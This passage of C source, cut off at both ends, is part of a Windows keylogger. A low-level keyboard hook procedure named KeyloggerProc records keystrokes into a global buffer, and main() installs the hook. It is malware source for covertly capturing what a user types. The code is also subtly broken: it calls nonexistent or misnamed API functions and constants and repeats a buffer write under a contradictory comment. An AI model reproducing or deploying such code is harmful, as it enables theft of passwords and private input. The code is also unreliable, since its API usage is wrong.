            if (g_keystrokeCount < MAX_KEYSTROKES) {
                g_keystrokes[g_keystrokeCount] = key;
                g_keystrokeCount++;
                g_keystrokes[g_keystrokeCount - 1] = key; // To overwrite the last one if it's beyond the buffer
            }
        }
    } else if (nCode == HCN_KEYUP) {
        // Handle key releases, if needed
    }
    return CallNextHook(nCode, wParam, lParam);
}

int main() {
    // Initialize the keystrokes array
    memset(g_keystrokes, 0, sizeof(g_keystrokes));

    // Set up the keyboard hook
    g_hook = SetWindowsHookW(WH_KEYBOARD_LL, KeyloggerProc, 0);
    if (!g_hook) {
        printf("Failed to set keyboard hook!\n");
